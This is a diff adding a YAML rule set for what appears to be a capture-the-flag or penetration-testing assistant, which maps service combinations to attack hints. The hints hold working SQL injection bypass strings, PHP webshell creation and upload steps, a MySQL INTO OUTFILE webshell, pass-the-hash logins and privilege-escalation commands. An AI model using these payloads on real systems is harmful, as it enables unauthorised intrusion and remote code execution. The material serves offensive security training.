@@ -1,0 +1,211 @@
+# Compound pattern rules -- require multiple conditions to fire.
+# These capture attack path combinations that are more valuable than
+# any single finding alone.
+
+rules:
+
+  # -------------------------------------------------------------------------
+  # Web + Database combinations
+  # -------------------------------------------------------------------------
+
+  - id: compound-login-sqli-opportunity
+    name: "Login Page + Database = SQLi Opportunity"
+    hint: >
+      A login form and a database service (MySQL/MSSQL/PostgreSQL) are both present.
+      This is a strong candidate for SQL injection. Test the login form with:
+      Username: ' OR 1=1-- -    Password: anything
+      Username: admin'--         Password: anything
+      If the application uses parameterised queries, sqlmap can confirm:
+      sqlmap -u http://<target>/login.php --data "user=test&pass=test" --dbs
+    confidence: 0.90
+    priority: 1
+    mitre: ["T1190", "T1078"]
+    tags: [sqli, web, database, compound]
+    conditions:
+      - type: web_endpoint
+        pattern: "/(login|signin|auth|logon)"
+      - type: service_port
+        port: 3306
+      - type: tool_not_used
+        tool: sqlmap
+
+  - id: compound-upload-webshell-path
+    name: "Upload Endpoint + Web Server = Webshell Upload Path"
+    hint: >
+      A file upload endpoint and a writable web server are present together.
+      This is the classic webshell upload attack path.
+      Step 1: Create a PHP webshell -- echo '<?php system($_GET["c"]); ?>' > shell.php
+      Step 2: Upload it via the upload form, trying bypass techniques if needed.
+      Step 3: Find where uploads are stored (check /uploads/, /files/, /media/).
+      Step 4: Trigger execution via: curl http://<target>/uploads/shell.php?c=id
+    confidence: 0.88
+    priority: 1
+    mitre: ["T1505.003", "T1190"]
+    tags: [upload, webshell, rce, compound]
+    conditions:
+      - type: web_endpoint
+        pattern: "/(upload|uploads|file|files|media)"
+      - type: service_name
+        name: http
+
+  - id: compound-mysql-outfile-webshell
+    name: "MySQL Access + Web Server = INTO OUTFILE Webshell"
+    hint: >
+      MySQL and a web server are both running. If you can authenticate to MySQL,
+      write a webshell directly into the webroot:
+      SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+      Requires: FILE privilege, secure_file_priv not set, and knowledge of webroot path.
+      Guess webroot from Apache config or try /var/www/html, /var/www, /srv/www.
+    confidence: 0.85
+    priority: 1
+    mitre: ["T1505.003", "T1059.004"]
+    tags: [mysql, webshell, rce, compound]
+    conditions:
+      - type: service_port
+        port: 3306
+      - type: service_name
+        name: http
+      - type: tool_used
+        tool: nmap
+
+  # -------------------------------------------------------------------------
+  # Enumeration gaps
+  # -------------------------------------------------------------------------
+
+  - id: compound-web-no-dirbust
+    name: "Web Server Found But No Directory Brute Force Run"
+    hint: >
+      A web server is running but no directory enumeration has been performed yet.
+      Start with: gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
+      Or faster: feroxbuster -u http://<target> -w /usr/share/wordlists/raft-medium-words.txt
+      Focus on finding: admin panels, login pages, backup files, and upload endpoints.
+    confidence: 0.82
+    priority: 2
+    mitre: ["T1083", "T1046"]
+    tags: [web, enumeration, gobuster, gap, compound]
+    conditions:
+      - type: service_name
+        name: http
+      - type: tool_not_used
+        tool: gobuster
+      - type: tool_not_used
+        tool: ffuf
+      - type: tool_not_used
+        tool: feroxbuster
+      - type: tool_not_used
+        tool: dirb
+
+  - id: compound-smb-mysql-no-enum
+    name: "SMB + MySQL Both Unenumerated"
+    hint: >
+      Both SMB and MySQL are open and neither has been enumerated.
+      Prioritise SMB first since it often yields more: enum4linux -a <target>
+      Then: mysql -h <target> -u root (no password for MySQL 5.0.x)
+      SMB null sessions can reveal domain users; MySQL can provide data or RCE.
+    confidence: 0.78
+    priority: 2
+    mitre: ["T1135", "T1078.001"]
+    tags: [smb, mysql, enumeration, gap, compound]
+    conditions:
+      - type: service_port
+        port: 445
+      - type: service_port
+        port: 3306
+      - type: tool_not_used
+        tool: enum4linux
+      - type: tool_not_used
+        tool: smbmap
+
+  # -------------------------------------------------------------------------
+  # Privilege escalation indicators
+  # -------------------------------------------------------------------------
+
+  - id: compound-creds-winrm-available
+    name: "Credentials Found + WinRM Open = Lateral Movement"
+    hint: >
+      You have credentials and WinRM (port 5985) is open.
+      Try: evil-winrm -i <target> -u <username> -p <password>
+      If domain credentials, try pass-the-hash: evil-winrm -i <target> -u <user> -H <NTLM_hash>
+      Once in, run: whoami /priv to check for privilege escalation opportunities.
+    confidence: 0.92
+    priority: 1
+    mitre: ["T1021.006", "T1550.002"]
+    tags: [winrm, lateral-movement, credentials, compound]
+    conditions:
+      - type: service_port
+        port: 5985
+      - type: has_credentials
+
+  - id: compound-creds-ssh-login
+    name: "Credentials Found + SSH Open = Try SSH Login"
+    hint: >
+      Credentials have been found and SSH is available. Attempt login:
+      ssh <username>@<target>
+      If using a private key: ssh -i id_rsa <user>@<target>
+      Once logged in: sudo -l to check for NOPASSWD entries, find / -perm -4000 for SUID binaries.
+    confidence: 0.90
+    priority: 1
+    mitre: ["T1021.004", "T1078"]
+    tags: [ssh, lateral-movement, credentials, compound]
+    conditions:
+      - type: service_port
+        port: 22
+      - type: has_credentials
+
+  - id: compound-creds-smb-shares
+    name: "Credentials Found + SMB Open = Access Shares"
+    hint: >
+      Credentials are available and SMB is listening. Enumerate accessible shares:
+      crackmapexec smb <target> -u <user> -p <pass> --shares
+      smbclient //<target>/SHARE -U <user>%<pass>
+      Look for sensitive files, stored passwords, and scripts that run as higher-privileged users.
+    confidence: 0.88
+    priority: 1
+    mitre: ["T1021.002", "T1039"]
+    tags: [smb, credentials, file-access, compound]
+    conditions:
+      - type: service_port
+        port: 445
+      - type: has_credentials
+
+  # -------------------------------------------------------------------------
+  # Post-exploitation pointers
+  # -------------------------------------------------------------------------
+
+  - id: compound-shell-privesc-linux
+    name: "Initial Foothold -- Linux Privilege Escalation Checklist"
+    hint: >
+      You appear to have shell access. Start privilege escalation enumeration:
+      (1) sudo -l -- look for NOPASSWD commands.
+      (2) find / -perm -4000 2>/dev/null -- find SUID binaries (check GTFObins).
+      (3) cat /etc/crontab and ls -la /etc/cron.* -- check for writable cron jobs.
+      (4) Run linpeas.sh for comprehensive enumeration.
+    confidence: 0.80
+    priority: 1
+    mitre: ["T1548.001", "T1053.003", "T1548.003"]
+    tags: [privesc, linux, post-exploitation, compound]
+    conditions:
+      - type: has_credentials
+      - type: service_port
+        port: 22
+      - type: no_flags
+
+  - id: compound-flag-not-found-all-tools-run
+    name: "Extensive Recon Done -- Consider Pivoting Approach"
+    hint: >
+      Multiple tools have been run and findings exist, but no flag has been captured yet.
+      Consider these often-missed approaches:
+      (1) Version-specific exploits -- check searchsploit for every version found.
+      (2) Default credentials on every service, not just the obvious ones.
+      (3) Password reuse -- if you have one password, try it everywhere.
+      (4) Check for hidden vhosts: gobuster vhost -u http://<target> -w subdomains.txt
+    confidence: 0.72
+    priority: 2
+    mitre: ["T1190", "T1078"]
+    tags: [pivot, strategy, compound]
+    conditions:
+      - type: tool_used
+        tool: nmap
+      - type: tool_used
+        tool: gobuster
+      - type: no_flags
